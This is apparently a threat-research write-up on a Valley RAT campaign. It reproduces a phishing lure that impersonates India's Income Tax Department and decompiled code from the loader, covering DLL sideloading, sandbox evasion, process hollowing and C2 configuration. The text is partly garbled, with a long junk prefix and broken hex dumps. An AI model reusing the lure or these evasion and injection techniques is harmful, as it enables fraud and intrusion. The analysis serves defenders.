1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/\n  \n\nMalicious email  \n\nWe found an interesting email uploaded from India with just an attachment called \"TOPsoE India Private Limited\". The pdf looked like an official Income Tax Department document. Upon clicking on the pdf, \"ggwk[.]cc\" opens up on the browser and a zip file called \"tax affairs.exe\" is downloaded.\n\n<--- Page Split --->\n\nNo. TAX/PEN/2025-142 \n\nभारत सरकार / Government of India\nवित्त मंत्रालय / Ministry of Finance\nआयकर विभाग / Income Tax Department\nप्रवर्तन प्रभाग / Enforcement Division \n\nAayakar Bhavan,\nNew Delhi - 110001 \n\nOFFICE MEMORANDUM \n\nSub: कर अनुपालन की कमी और दंड सूचना / Tax Compliance Deficiency and Penalty Notice \n\n1. आपकी कमनी की कर निरीक्षण के दौरान आयकर अधिनियम, 1961 की धारा 271(1)(c) के तहत कर संबंधी अनियमिताएं पाई गई हैं। The tax inspection of your company has revealed irregularities under Section 271(1)(c) of the Income Tax Act, 1961. \n\n2. इस सूचना की प्राप्ति के 72 घंटे (3 दिन) के भीतर निम्नलिखित दस्तावेज आयकर विभाग को प्रस्तुत करना अनिवार्य है। It is mandatory to submit the following documents to the Income Tax Department within 72 hours (3 days) of receipt of this notice. \n\nआवश्यक दस्तावेज सूची / Required Documents List\nनीचे दिए गए लिंक से दस्तावेज डाउनलोड करें / Download documents from the link below \n\nदस्तावेज डाउनलोड करें / Download Documents \n\n3. निर्धारित समयावधि में दस्तावेज प्रस्तुत न करने पर आयकर अधिनियम की धारा 276C के तहत कानूनी कार्रवाई की जाएगी। Legal action will be taken under Section 276C of the Income Tax Act if documents are not submitted within the stipulated time. \n\n(राज कुमार शर्मा) \n\nRaj Kumar Sharma \n\nसहायक आयकर आयुक्त \n\nAssistant Commissioner of Income Tax \n\nTechnical Analysis \n\nStage - 1: Tax Affairs.zip \n\nPE32 \n\nOperation system: Windows(2000)[1386, 32-bit, GUI] \n\nLinker: Microsoft Linker(10.00.40219) \n\nCompiler: Microsoft Visual C/C++(16.00.40219)[C] \n\nLanguage: C \n\nTool: Visual Studio(2010) \n\n(Heur) Packer: Compressed or packed data[Strange overlay] \n\nInstaller: Nullsoft Scriptable Install System(2.46.5-ANSI) \n\nOverlay: Binary[Offset=0x00034c00,Size=0x002a2e40] \n\nUnknown: Unknown \n\nDetect It Easy \n\nUsing static analysis we see that the given PE file is a 32 bit GUI binary. More importantly, the file is identified as a Nullsoft Scriptable Install system (NSIS) installer. NSIS installers embed their installation script, compressed payloads etc inside the binary itself and we can move ahead to analyse it as an installer driven staging payload.\n\n<--- Page Split --->\nGetTempPathA(0x10000u, PathName); \n\nif ( sub_4032CB() || (GetWindowsDirectoryA(PathName, 0xFFBu), lstrcatA(PathName, \"\\Temp\"), sub_4032CB()) \n\nDeleteFileA(FileName); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = (const char *)sub_403030(Buffer); \n\nif (!Error_writing_temporary_file._Make_sure_your_temp_folder_is_val ) \n\nif (!dword_433C24 ) \n\n{ \n\nABEL_34: \n\nuExitCode = -1; \n\nuExitCode = sub_4052E6(); \n\ngoto LABEL_35; \n\n} \n\nfor ( i = (CHAR *)sub_40567B(&sz, 0); i >= &sz && sub_4032FF(i, \"_=\", 4); --i ) \n\n; \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = \"Error launching installer\"; \n\nif ( i >= &sz ) \n\n{ \n\n* i = 0; \n\nlpString2_3 = i + 4; \n\nif ( !sub_405EFC(lpString2_3) ) \n\ngoto LABEL_35; \n\nlstrcpyAn_wrp(&lpString1_, lpString2_3); \n\nlstrcpyAn_wrp(Directory, lpString2_3); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = 0; \n\ngoto LABEL_34; \n\n} \n\nlstrcatA(PathName, \"\\nsu.tmp\"); \n\nif ( lstrcmpiA(PathName, ::lpString2) ) \n\n{ \n\nCreateDirectoryA(PathName, 0); \n\nSetCurrentDirectoryA(PathName); \n\nif ( !lpString1_ ) \n\nlstrcpyAn_wrp(&lpString1_, ::lpString2); \n\nlstrcpyAn_wrp(lpString1_, lpString2); \n\nlstrcpyAn_wrp(&lpString1_0, \"A\"); \n\nn26 = 26;<｜end▁of▁sentence｜>\n\n<center>NSIS Installer </center>  \n\nThe NSIS installer begins by resolving a writable temporary directory using GetTempPathA. If the operation fails, it falls back to C:\\Windows\\Temp, ensuring execution reliability. Once a valid location is identified, the installer creates an NSIS specific working directory (\\~nsu.tmp) and switches the directory to it.  \n\nDropped Files   \n\n<table><tr><td>ndoe &amp;gt; AppData &amp;gt; Local &amp;gt; Temp</td><td></td><td></td><td></td></tr><tr><td>Name</td><td>Date modified</td><td>Type</td><td>Size</td></tr><tr><td>Thunder.exe</td><td>7/24/2024 10:42 PM</td><td>Application</td><td>635 KB</td></tr><tr><td>FastAnimation.dll</td><td>5/27/2025 4:38 AM</td><td>Application extens...</td><td>578 KB</td></tr><tr><td>leakrepair.dll</td><td>5/27/2025 4:40 AM</td><td>Application extens...</td><td>716 KB</td></tr><tr><td>dynlbase.dll</td><td>5/27/2025 4:48 AM</td><td>Application extens...</td><td>1,431 KB</td></tr><tr><td>libaw.dat</td><td>5/27/2025 4:59 AM</td><td>DAT File</td><td>1,121 KB</td></tr><tr><td>DumpUper.ini</td><td>5/27/2025 5:01 AM</td><td>Configuration setti...</td><td>2 KB</td></tr><tr><td>libdefa.dat</td><td>9/16/2025 7:38 AM</td><td>DAT File</td><td>321 KB</td></tr><tr><td>box.ini</td><td>9/25/2025 8:00 PM</td><td>Configuration setti...</td><td>126 KB</td></tr><tr><td>libexpat.dll</td><td>9/25/2025 8:13 PM</td><td>Application extens...</td><td>32 KB</td></tr></table>  \n\nUpon analysis we found that only 2 files are of use to us, Thunder.exe and libexpat.dll. Thunder.exe is a legitimate, digitally signed executable developed by Xunlei (迅雷), commonly distributed as part of the Thunder download manager ecosystem. In this infection chain, the binary itself is not malicious but is abused as a DLL hijacking host. When executed from installer's temporary directory, Thunder.exe loads libexpat.dll from its local path due to default DLL search order. We can confirm this in x64dbg.\n\n<--- Page Split --->\npos: 0%\n\npush eax\n\njmp tax affairs.402008\n\npush F\n\ncall tax affairs.405A65\n\npush 64\n\npush dword ptr ss:[ebp+8]\n\ncall esi\n\ncmp eax,102\n\nje tax affairs.401FFC\n\nlea eax,dword ptr ss:[ebp-8]\n\npush eax\n\npush dword ptr ss:[ebp+8]\n\ncall dword ptr ds:[<GetExitCodeProcess>]\n\ncmp dword ptr ss:[ebp-20],ebx\n\njl tax affairs.40202E\n\npush dword ptr ss:[ebp-8]\n\npush edi\n\ncall tax affairs.40589E\n\njmp tax affairs.40203A\n\ncmp dword ptr ss:[ebp-8],ebx\n\nje tax affairs.40203A\n\nmov dword ptr ss:[ebp-4],1\n\npush dword ptr ss:[ebp+8]<｜end▁of▁sentence｜>\n\n<center>DLL Loading </center>  \n\n## Stage - 2 : libexpat.dll  \n\nThe dropped libexpat.dll does not export any meaningful functions and is never explicitly invoked by Thunder.exe.The dll relies on the windows loader functionality and calls the DLLMain. This callback is invoked unconditionally, regardless of whether the DLL exports any functions or is actively used by the host process.  \n\nLet's take a look at the working of the DLL.  \n\nv4 = IsDebuggerPresent(); \n\nv5 = &unk_100056DC; \n\nif (!v4) \n\nv5 = &unk_100056E4; \n\nLogStatus((char *)&Format_1, v5); \n\nif (v4) \n\n{ \n\nLogStatus((char *)&Format_2); \n\nreturn 0; \n\n} \n\nelse if (CheckSystemResources()) \n\nGetSystemInfo(&SystemInfo); \n\ndwNumberOfProcessors = SystemInfo.dwNumberOfProcessors; \n\nv7 = &unk_1000560C; \n\nif ( SystemInfo.dwNumberOfProcessors < 4 ) \n\nv7 = &unk_10005614; \n\nLogStatus(aCpu, SystemInfo.dwNumberOfProcessors, v7); \n\nif ( dwNumberOfProcessors >= 4 ) \n\n{ \n\nif (!(unsigned __int8)Persistence()) \n\nLogStatus((char *)&Format_3); \n\nToolHelp32Snapshot = CreateToolhelp32Snapshot(2u, 0); \n\nif ( ToolHelp32Snapshot != (HANDLE)-1 ) \n\n{ \n\npe.dwSize = 556; \n\nif ( Process32Firstw(Toolhelp32Snapshot, &pe) ) \n\n{ \n\ndo \n\n{ \n\nv9 = wcscmp(pe.szExeFile, L\"ida.exe\"); \n\nif ( v9 ) \n\nv9 = v9 < 0 ? -1 : 1; \n\nif (!v9 ) \n\nLogStatus((char *)&Format_4, pe.th32ProcessID); \n\nv10 = wcscmp(pe.szExeFile, L\"x64dbg.exe\"); \n\nif ( v10 ) \n\nv10 = v10 < 0 ? -1 : 1; \n\nif (!v10 ) \n\nLogStatus((char *)&Format_5, pe.th32ProcessID); \n\n} \n\nwhile ( Process32Nextw(Toolhelp32Snapshot, &pe) );<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nThe Main function begins by many anti debugging and sandbox techniques.The DLL performs process enumeration and scans the process list for common analysis and sandbox tools. Also the DLL queries for the system resources checking if minimum requirements are satisfied or not. In addition to that, if it detects any sandbox environment, it terminates the malware.  \n\nif (!DisableWindowsUpdateService() ) \n\nLogStatus((char *)&Format_6); \n\nBlock[0] = 0; \n\nBlock[1] = 0; \n\nv17 = 0; \n\nv18 = 0; \n\nif ( LoadAndDecryptPayload(Block) ) \n\nv11 = ProcessHollowing((int)Block); \n\nFormat = (char *)&unk_100059C0; \n\nif ( v11 ) \n\nFormat = (char *)&byte_100059CC; \n\n} \n\nelse \n\n} \n\nFormat = (char *)&unk_100059E0; \n\n} \n\nLogStatus(Format); \n\nDisableThreadLibraryCalls(hinstDLL); \n\nCreateThread(0, 0, StartAddress, 0, 0, 0); \n\nv13 = Block[0]; \n\nif ( Block[0] ) \n\n} \n\nif ( v17 - (unsigned int)Block[0] >= 0x1000 ) \n\nv13 = (void *)*((_DWORD *)Block[0] - 1); \n\nif ( (unsigned int)((char *)Block[0] - (char *)v13 - 4) > 0x1F ) \n\ninvalid_parameter_noinfo_noreturn(); \n\n} \n\nsub_10003E6E(v13);<｜end▁of▁sentence｜>\n\n<center>Payload Decryption </center>  \n\nOnce the DLL completes its anti analysis checks, it enters the core execution logic. It first disables the Windows Update service(wuauserv) then loads an encrypted payload from the disk. The payload is dynamically resolved and loads the box.ini file from the temporary directory. The file is fully read into memory, decrypted using embedded cryptographic constants and later on executed as shellcode.  \n\n<table><tr><td>00</td><td>01</td><td>02</td><td>03</td><td>04</td><td>05</td><td>06</td><td>07</td><td>08</td><td>09</td><td>OA</td><td>OB</td><td>OC</td><td>OD</td><td>OE</td><td>OF</td></tr><tr><td>9B</td><td>80</td><td>9D</td><td>8E</td><td>89</td><td>C3</td><td>23</td><td>6B</td><td>A6</td><td>95</td><td>C5</td><td>FC</td><td>B7</td><td>2A</td><td>CB</td><td>OD</td></tr><tr><td>D4</td><td>CF</td><td>6B</td><td>FF</td><td>F8</td><td>6F</td><td>AC</td><td>9C</td><td>D8</td><td>94</td><td>6A</td><td>50</td><td>32</td><td>F0</td><td>B1</td><td>FC</td></tr><tr><td>E1</td><td>29</td><td>25</td><td>0D</td><td>5A</td><td>2A</td><td>E7</td><td>A3</td><td>4C</td><td>7B</td><td>54</td><td>A1</td><td>F7</td><td>2B</td><td>4E</td><td>60</td></tr><tr><td>14</td><td>CF</td><td>71</td><td>43</td><td>65</td><td>4B</td><td>B3</td><td>12</td><td>80</td><td>73</td><td>54</td><td>F5</td><td>A4</td><td>0B</td><td>ED</td><td>71</td></tr><tr><td>A6</td><td>6B</td><td>6B</td><td>5C</td><td>0D</td><td>6F</td><td>57</td><td>F0</td><td>F8</td><td>C3</td><td>F6</td><td>15</td><td>F2</td><td>8F</td><td>81</td><td>EB</td></tr><tr><td>6C</td><td>18</td><td>A0</td><td>F4</td><td>DB</td><td>9F</td><td>47</td><td>00</td><td>8C</td><td>A7</td><td>CE</td><td>0E</td><td>EB</td><td>92</td><td>CF</td><td>89</td></tr><tr><td>83</td><td>87</td><td>D0</td><td>70</td><td>D4</td><td>C9</td><td>42</td><td>64</td><td>BF</td><td>78</td><td>8D</td><td>C5</td><td>84</td><td>93</td><td>9B</td><td>90</td></tr><tr><td>74</td><td>BA</td><td>DE</td><td>B5</td><td>E8</td><td>A1</td><td>86</td><td>44</td><td>CC</td><td>AD</td><td>C3</td><td>C0</td><td>7C</td><td>A1</td><td>94</td><td>6F</td></tr><tr><td>54</td><td>62</td><td>72</td><td>F8</td><td>9F</td><td>6F</td><td>C4</td><td>R9</td><td>07</td><td>19</td><td>1D</td><td>F7</td><td>6F</td><td>17</td><td>DN</td><td>8F</td></tr></table>\n\nDecoded text \n\n\"E.ZNA#k!·Aü·*E.\nÖİkyoo-oeo\"jP2&tü\ná)%.Z*ç£L(Tj÷+N'\n.İqCeK°.eStÖn.iq\n!kk\\.ow&oAö.ö..ë\n1. öÜYG.ÇSİ.ë'İn\nf#DpÖÉBdžx.Ä„“>.\nt°Pue;tDİ.ÄÄ|;\"o\nThræšnÄi...-n.ÝÝ<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\nStartupInfo.dwFlags = STARTF_USESHOWWINDOW; \n\nmemset(&StartupInfo.wShowWindow, 0, 20); \n\nif ( GetFileAttributesA(\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\") == -1 ) \n\nLastError = GetLastError(); \n\nLogStatus((char *)&Format_17, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", LastError); return 0; \n\nif (!CreateProcessA( \n\n\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", \n\n0, \n\n0, \n\n0, \n\n0, \n\nCREATE_SUSPENDED | CREATE_NO_WINDOW, \n\n0, \n\n0, \n\n&StartupInfo, \n\n&ProcessInformation) ) \n\n{ \n\nerr = GetLastError(); \n\nLogStatus((char *)&Format_18, err, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\"); return 0; \n\nLogStatus((char *)&Format_19, ProcessInformation.dwProcessId, ProcessInformation.dwThreadId); Context.ContextFlags = 65543; \n\nif (!GetThreadContext(ProcessInformation.hThread, &Context) ) \n\nerr_1 = GetLastError(); \n\nLogStatus((char *)&Format_20, err_1); \n\nLABEL_7: \n\nCloseHandle(ProcessInformation.hThread); \n\nCloseHandle(ProcessInformation.hProcess);<｜end▁of▁sentence｜>\n\n<center>Process Injection </center>  \n\nThe shellcode is executed using a classic technique called Process Injection. The routine begins by verifying the presence of explorer.exe, which is later used as the target process. The binary is launched in suspended state and the malware retrieves the initial thread context. Further it allocates executable memory inside the remote process via VirtualAllocEx and writes the payload via WriteProcessMemory.  \n\nerrno_t LogStatus(char *Format, ...) \n\nerrno_t result; // eax \n\nint v2; // ecx \n\nsigned int Size; // kr00_4 \n\nvoid *Buffer_3; // edi \n\nsigned int i; // edx \n\nFILE *Stream; // [esp+Ch] [ebp-880h] BYREF \n\n_SYSTEMTIME SystemTime; // [esp+10h] [ebp-87Ch] BYREF \n\nchar Buffer[1024]; // [esp+20h] [ebp-86Ch] BYREF \n\nchar Buffer_2[1092]; // [esp+420h] [ebp-46Ch] BYREF \n\nchar Buffer_1[32]; // [esp+864h] [ebp-28h] BYREF \n\nva_list ArgList; // [esp+898h] [ebp+Ch] BYREF \n\nva_start(ArgList, Format); \n\nStream = 0; \n\nresult = fopen_s(&Stream, \"C:\\\\data.db\", \"ab+\"); \n\nif (!result && Stream) \n\nGetLocalTime(&SystemTime); \n\nsub_10003860(Buffer_1, \"[%04d-%02d-%02d %02d:%02d:%02d]\", SystemTime.wYear); \n\nsub_10001050(Buffer, v2, Format, v2, ArgList); \n\nsub_10003880(Buffer_2, \"%s%s\\n\", (char)Buffer_1); \n\nSize = strlen(Buffer_2); \n\nBuffer_3 = malloc(Size); \n\nif ( Buffer_3 ) \n\nmemcpy(Buffer_3, Buffer_2, Size); \n\nfor ( i = 0; i < Size; ++i ) \n\n*((_BYTE *)Buffer_3 + i) = 89 - (byte_10005A84[i & 7] ^ _ROL1_(*((_BYTE *)Buffer_3 + i), 2)); \n\nfwrite(Buffer_3, 1u, Size, Stream); \n\nfree(Buffer_3);<｜end▁of▁sentence｜>\n  \n\nThe LogStatus function implements an internal logging mechanism used throughout the DLL to record execution progress and error states. The function formats a timestamped log message, appends it to a local file (C:\\data.db), and applies a lightweight custom obfuscation before writing it to disk.\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n\n<center>Encrypted Payload in memory </center>  \n\nThe injected payload can be dumped by attaching a debugger to the hollowed explorer.exe process and monitoring the memory region allocated via VirtualAllocEx. Once the payload is written using WriteProcessMemory and execution is redirected, the allocated region can be dumped directly from memory, yielding the next stage payload for analysis.  \n\nE8 C0 C9 01 00 C0 C9 01 00 33 56 67 6A 66 95 EE 1AE..AE..3Vgif+1 87 5C F8 F3 F1 E1 9C 4D FE B8 FB 9E ED 69 D4 A2 +o6n6a0p,u- ii0c AF 92 B5 95 6C 05 E4 4C CF 00 00 00 00 OA 61 C2 \"u1.aII...aA E4 7A BA 59 20 00 CC 85 43 9D 07 BD 84 A1 72 64 azY..I..C..s,ird 87 8D F5 7D 2F 8B 4F BA 65 62 C1 4C 81 4C 42 AD +.6/0eBAL.LB. 4E CE 6F 33 67 E3 86 63 6B 37 39 8E 74 EA 1F 89 Nf03g4tck79Zte.k D1 AA 05 F0 14 E3 29 7E D7 19 CB 5E C3 96 14 6B N*.6.a)~x.E^A-k 9F 2F 0A 75 3C EF 0A EA 05 F8 1E 07 AD D0 81 6E Y/.uc1.e..D.n B8 2E F2 31 BF F5 FB 33 45 B8 7C 16 71 B6 40 D3 .0lz0u3E,1.qf0 70 68 0F B6 38 B9 33 F4 AE F4 60 6A 34 33 D3 4C ph.f8+3o0'j43OL CE 2E F9 08 0F F0 4C 2C E0 0C A7 EB F9 77 6D B5 I.u..6L,a.5eWmu 8F 96 C2 C9 18 01 63 E8 64 5A B4 CE E8 8E 14 BF -AE..cedz'feZ.z 85 BE FB CE F5 37 55 18 A3 FA 31 B2 7E 81 36 39 .n6f7U.fu1~.69 9A 70 DF 6E 59 F3 C2 63 78 81 48 51 DA 01 88 26 apBnY6Acx.HQU.^ 6A 15 E3 36 BA B2 CC 05 D1 63 F5 7A 1B DC D4 8F .6e+1.Nc0z.u0. 15 17 C8 B6 D7 06 8D 05 40 8A A5 38 38 D4 03 B7 .Ef..d5f80. BC AA AE D5 DF BF 0D 5A 14 EB E2 FB 2A 2D 03 16 +o0z.z.eaU~.  \n\nLooking through the decrypted payload we find that the final payload is a Donut generated shellcode. In this setup, Donut is used to wrap a managed payload into raw shellcode, allowing it to be executed entirely from memory without touching disk.  \n\nBinary \n\nShellcode: Donut(0.9.2)[x86] \n\nS ?<｜end▁of▁sentence｜>\n  \n\nWe can dump the Donut payload by using tools like undonut or donut- decryptor.  \n\n## Stage - 4 : Valley RAT  \n\nAfter the Donut loader successfully injects the final payload into the hollowed explorer.exe process, Valley RAT initializes its sophisticated configuration management subsystem. It starts off by setting anti analysis procedures and then invokes a function sub_405E40() to initialize it's configuration and later create a thread for C2 communication.\n\n<--- Page Split --->\nif (!byte_41DA8C ) \n\n{\n\nbyte_41DA8C = 1;\n\n_wcsrev(a0Db1k1Hs0ld0L);\n\nmemset(&src, 0, 0x12A0u);\n\nsub_405D70('L\"p1:\", Source, 0);\n\nsub_405D70('L\"o1:\", Source_2, 0);\n\nsub_405D70('L\"t1:\", 0, (int)&dword_41CA30);\n\nsub_405D70('L\"p2:\", Source_0, 0);\n\nsub_405D70('L\"o2:\", Source_1, 0);\n\nsub_405D70('L\"t2:\", 0, (int)&dword_41CC70);\n\nsub_405D70('L\"p3:\", Source_3, 0);\n\nsub_405D70('L\"o3:\", Source_4, 0);\n\nsub_405D70('L\"t3:\", 0, (int)&dword_41CE80);\n\nsub_405D70('L\"dd:\", word_41CEF0, 0);\n\nsub_405D70('L\"cl:\", word_41CF2C, 0);\n\nsub_405D70('L\"bb:\", &word_41CF4, 0);\n\nsub_405D70('L\"bb:\", &word_41CFF4, 0);\n\nsub_405D70('L\"jp:\", 0, (int)&unk_41D058);\n\nsub_405D70('L\"sx:\", 0, (int)&unk_41D05C);\n\nsub_405D70('L\"bh:\", 0, (int)&unk_41D060);\n\nsub_405D70('L\"ll:\", 0, (int)&unk_41D064);\n\nsub_405D70('L\"dl:\", 0, (int)&unk_41D06C);\n\nsub_405D70('L\"bd:\", 0, (int)&unk_41D074);\n\n//\"|0:db|1:1k|1:hs|0:1d|0:11|0:hb|1:pj|52.9 .5202:zb|0.1:bb|\"\n\n**Primary C2**\n\n**Tertiary C2**\n\n**Delay**\n\n**Interval**\n\n**Build Version**\n\n**Download**\n\n**Shell**\n\n**Keylogger**\n\n**Backdoor**<｜end▁of▁sentence｜>\n\n<center>C2 Configuration </center>  \n\nThe function implements a two stage loading mechanism. It extracts 22 distinct configuration parameters through a parsing function.  \n\n## Stage 1  \n\n## Command & Control Infrastructure (9 parameters):  \n\n- p1:, p2:, p3: - Three-tier C2 server addresses (correlates with b[.]yuxuanow[.]top identified in network analysis)- o1:, o2:, o3: - Corresponding port numbers for each C2 tier- t1:, t2:, t3: - Connection type flags (1 = HTTP/HTTPS, 0 = raw TCP socket)  \n\n## Operational Parameters (5 parameters):  \n\n- dd: - Initial sleep delay (seconds) before first C2 contact- cl: - Callback interval (seconds) between beaconing attempts- bb: - Build/bot version identifier (observed: 1.0)- bz: - Backup C2 address- fz: - Unknown parameter  \n\n## Feature Flags (8 boolean parameters):  \n\n- kl: - Keylogger (1 = enabled, 0 = disabled)- sh: - Remote shell access (1 = enabled, 0 = disabled)- bd: - Full backdoor mode (1 = enabled, 0 = disabled)- dl: - Download/file transfer capability- jp:, sx:, bh:, ll: - Additional feature toggles  \n\n## Stage 2  \n\nAfter loading the embedded configuration, Valley RAT queries the Windows registry for updated C2 infrastructure:\n\n<--- Page Split --->\ncbData = 0; \n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\", 0, KEY_READ, &phkResult))\nRegQueryValueExW(phkResult, L\"IpDate\", 0, &Type, 0, &cbData); \n\nif ( cbData > 0xA ) \n\nmemset( \n\na0Db1Lk1Hs0Ld0L, // \"|0:db|1:lk|1:hs|0:1d|0:11|0:hb|1:pj\n0, \n\n0x7D0u); \n\nRegQueryValueExW( \n\nphkResult, \n\nL\"IpDate\", \n\n0, \n\n&Type, \n\n(LPBYTE)a0Db1Lk1Hs0Ld0L, \n\n&cbData); \n\nsub_405D70(L\"p1:\", Source, 0); \n\nsub_405D70(L\"o1:\", Source_2, 0); \n\nsub_405D70(L\"t1:\", 0, &dword_41CA30); \n\nsub_405D70(L\"p2:\", Source_0, 0); \n\nsub_405D70(L\"o2:\", Source_1, 0); \n\nsub_405D70(L\"t2:\", 0, &dword_41CC70); \n\nsub_405D70(L\"p3:\", Source_3, 0); \n\nsub_405D70(L\"o3:\", Source_4, 0); \n\nsub_405D70(L\"t3:\", 0, &dword_41CEB0);<｜end▁of▁sentence｜>\n\n<center>Persistence </center>  \n\nIf the registry value exists and exceeds 10 bytes, Valley RAT completely replaces its embedded configuration, then re- parses only the critical C2 parameters (p1 through t3). This allows Silver Fox operators to push updated C2 addresses without deploying new binaries or regaining code execution  \n\nAfter the configuration is loaded. Valley RAT spawns its payload thread(StartAddress) which implements a 3 tier C2 communication loop.  \n\nwhile ( 1 ) \n\n{\n\nnullsub_1();\n\nif ( C2_TOGGLE_FLAG )\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p2_secondary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o2_secondary_c2);\n\nconnection_type_flag = config_t2_secondary_type;\n\nelse\n\n// Use Primary C2 Config\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p1_primary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, 